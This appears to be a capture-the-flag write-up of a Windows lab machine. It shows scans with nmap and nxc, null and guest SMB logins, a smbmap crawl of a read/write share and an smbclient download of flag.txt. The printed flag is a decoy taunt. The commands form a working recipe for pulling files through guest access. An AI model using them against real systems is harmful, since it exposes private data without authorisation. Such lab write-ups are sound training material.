**Difficulty:** Very Easy
**Category:** Network / SMB / Misconfiguration
**OS:** Windows
**Author:** Kerollos Atnass (@ProfessorOwl)
**Date:** 2026-08-14

---
### 1. Reconnaissance & Scanning:

**0x001- connectivity check:**
_Checking if the target is alive and verifying network routing._

```console
┌──(professor㉿Professor)-[~]
└─$ ping 10.129.8.232                          
PING 10.129.8.232 (10.129.8.232) 56(84) bytes of data.
64 bytes from 10.129.8.232: icmp_seq=1 ttl=127 time=129 ms
64 bytes from 10.129.8.232: icmp_seq=2 ttl=127 time=131 ms
^C
--- 10.129.8.232 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 129.229/130.051/130.873/0.822 ms
```

**0x002- Nmap Scanning:**
_To understand the exposed attack surface, we first identify open ports and running services. SMB on port 445 is interesting because it exposes file-sharing and authentication mechanisms that are worth enumerating._

```console
┌──(professor㉿Professor)-[~]
└─$ nmap -sV 10.129.8.232                      
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-14 22:50 MSK
Nmap scan report for 10.129.8.232
Host is up (0.23s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.75 seconds
```

--- 
### 2. Enumeration & Vulnerability Assessment

**0x003 SMB Fingerprinting:**
_Having identified SMB, the next step is to fingerprint the service and understand the target's SMB configuration before testing its authentication boundaries.

```console
┌──(professor㉿Professor)-[~]
└─$ nxc smb 10.129.8.232
SMB         10.129.8.232    445    DANCING          [*] Windows 10 / Server 2019 Build 17763 x64 (name:DANCING) (domain:Dancing) (signing:False) (SMBv1:False) 
```

**Target Info Extracted:**

- **Hostname:** DANCING
    
- **Domain:** Dancing
    
- **OS Version:** Windows 10 / Server 2019 Build 17763
    
- **SMB Signing:** Disabled (False)
    
- **SMBv1:** Disabled (False)

**0x004 Test anonymous/null authentication:**
_Checking whether the SMB service accepts null authentication._

```console
┌──(professor㉿Professor)-[~]
└─$ nxc smb 10.129.8.232 -u '' -p ''
SMB         10.129.8.232    445    DANCING          [*] Windows 10 / Server 2019 Build 17763 x64 (name:DANCING) (domain:Dancing) (signing:False) (SMBv1:False) 
SMB         10.129.8.232    445    DANCING          [+] Dancing\: 
```

**0x005 Identify Accessible Shares:**
_Listing available SMB shares and determining our access levels (Read/Write).

```console
┌──(professor㉿Professor)-[~]
└─$ smbmap -H 10.129.8.232 -u 'guest' -p ''        

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.8.232:445	Name: 10.129.8.232        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	WorkShares                                        	READ, WRITE	
[*] Closed 1 connections                                              
```

--- 
### 3. Exploitation & Data Exfiltration

**0x006 Recursive Share Enumeration:**
_Crawling the accessible `WorkShares` recursively to locate sensitive files._

```console
┌──(professor㉿Professor)-[~]
└─$ smbmap -r -H 10.129.8.232 -u 'guest' -p '' --depth 10

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.8.232:445	Name: 10.129.8.232        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	./IPC$
	fr--r--r--                3 Mon Jan  1 02:30:17 1601	InitShutdown
	fr--r--r--                4 Mon Jan  1 02:30:17 1601	lsass
	fr--r--r--                3 Mon Jan  1 02:30:17 1601	ntsvcs
	fr--r--r--                3 Mon Jan  1 02:30:17 1601	scerpc
	fr--r--r--                1 Mon Jan  1 02:30:17 1601	Winsock2\CatalogChangeListener-374-0
	fr--r--r--                3 Mon Jan  1 02:30:17 1601	epmapper
	fr--r--r--                1 Mon Jan  1 02:30:17 1601	Winsock2\CatalogChangeListener-1e8-0
	fr--r--r--                3 Mon Jan  1 02:30:17 1601	LSM_API_service
	fr--r--r--                3 Mon Jan  1 02:30:17 1601	eventlog
	fr--r--r--                1 Mon Jan  1 02:30:17 1601	Winsock2\CatalogChangeListener-290-0
	fr--r--r--                3 Mon Jan  1 02:30:17 1601	atsvc
	fr--r--r--                1 Mon Jan  1 02:30:17 1601	Winsock2\CatalogChangeListener-584-0
	fr--r--r--                5 Mon Jan  1 02:30:17 1601	wkssvc
	fr--r--r--                3 Mon Jan  1 02:30:17 1601	trkwks
	fr--r--r--                3 Mon Jan  1 02:30:17 1601	tapsrv
	fr--r--r--                3 Mon Jan  1 02:30:17 1601	W32TIME_ALT
	fr--r--r--                4 Mon Jan  1 02:30:17 1601	srvsvc
	fr--r--r--                1 Mon Jan  1 02:30:17 1601	Winsock2\CatalogChangeListener-274-0
	fr--r--r--                1 Mon Jan  1 02:30:17 1601	vgauth-service
	fr--r--r--                1 Mon Jan  1 02:30:17 1601	Winsock2\CatalogChangeListener-4d8-0
	fr--r--r--                3 Mon Jan  1 02:30:17 1601	ROUTER
	fr--r--r--                1 Mon Jan  1 02:30:17 1601	Winsock2\CatalogChangeListener-27c-0
	fr--r--r--                1 Mon Jan  1 02:30:17 1601	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
	WorkShares                                        	READ, WRITE	
	./WorkShares
	dr--r--r--                0 Sat Aug 15 03:35:46 2026	.
	dr--r--r--                0 Sat Aug 15 03:35:46 2026	..
	dr--r--r--                0 Mon Mar 29 12:08:24 2021	Amy.J
	dr--r--r--                0 Thu Jun  3 11:38:03 2021	James.P
	./WorkShares//Amy.J
	dr--r--r--                0 Mon Mar 29 12:08:24 2021	.
	dr--r--r--                0 Mon Mar 29 12:08:24 2021	..
	fr--r--r--               94 Mon Mar 29 12:08:24 2021	worknotes.txt
	./WorkShares//James.P
	dr--r--r--                0 Thu Jun  3 11:38:03 2021	.
	dr--r--r--                0 Thu Jun  3 11:38:03 2021	..
	fr--r--r--               32 Thu Jun  3 11:37:56 2021	flag.txt
[*] Closed 1 connections                  
```

**Relevant findings:**  
`WorkShares` is accessible with `READ, WRITE` permissions, and recursive enumeration reveals `James.P/flag.txt`.

**0x007 Catch The Flag:**
_Exfiltrating the target file via direct SMB stdout reading._

```console
┌──(professor㉿Professor)-[~]
└─$ smbclient -N //10.129.8.232/WorkShares -c 'get /James.P/flag.txt -' 2>/dev/null
QFByb2Zlc3Nvck93bCB8IERvbid0IENoZWF0
```
_(nice try, script kiddies 😏)_

--- 
### 4. Root Cause
The SMB service accepted null authentication. I then used the `guest` account with an empty password to enumerate the accessible shares.
Combined with the `WorkShares` share being exposed with
READ/WRITE permissions through the guest session, this allowed direct
enumeration and exfiltration of sensitive files without any credentials.

--- 
### 5. Capture The Flag (CTF)
**Flag:** QFByb2Zlc3Nvck93bCB8IERvbid0IENoZWF0 

---
###### Author
**Kerollos Atnass | كيرلس اطناس** 
*(a.k.a ProfessorOwl)*